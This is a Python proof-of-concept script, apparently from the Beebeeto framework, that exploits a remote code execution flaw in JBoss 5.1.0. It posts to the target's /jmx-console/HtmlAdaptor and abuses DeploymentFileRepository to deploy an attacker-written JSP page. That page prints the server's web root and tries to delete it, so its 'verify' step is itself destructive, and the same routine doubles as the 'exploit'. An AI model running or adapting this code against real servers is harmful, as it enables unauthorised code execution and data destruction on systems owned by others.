#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0105',
            'name': 'JBoss 5.1.0 DeploymentFileRepository 代码执行漏洞 POC',
            'author': 'Linglin',
            'create_date': '2015-05-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'JBoss',
            'vul_version': ['5.1.0'],
            'type': 'Code Execution',
            'tag': ['JBoss漏洞', 'DeploymentFileRepository', 'Remot Code Execution'],
            'desc': 'Jboss5.1.0默认配置允许直接部署代码到服务器上，可以执行攻击者提供的任意代码。',
            'references': ['http://www.securityfocus.com/bid/21219/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_code = ('\n<%@ page import="java.util.*,java.io.*" %>\n<%@ page import="'
                       'java.io.*"%>\n<%\nString path=request.getRealPath("");\nout.prin'
                       'tln(path);\nFile d=new File(path);\nif(d.exists()){\n  d.delete()'
                       ';\n  }\n%>\n<% out.println("this_is_not_exist_9.1314923");%>')
        payload = ('action=invokeOp&name=jboss.admin%%3Aservice%%3DDeploymentFileRepositor'
                   'y&methodIndex=5&arg0=test.war&arg1=test&arg2=.jsp&arg3=%s&arg4=True')
        verify_data = payload % urllib2.quote(verify_code)
        verify_url = args['options']['target'] + '/jmx-console/HtmlAdaptor'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        page_content = ''
        request = urllib2.Request(verify_url, verify_data)
        response = urllib2.urlopen(request)
        page_content = response.read()
        if 'this_is_not_exist_9.1314923' in page_content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())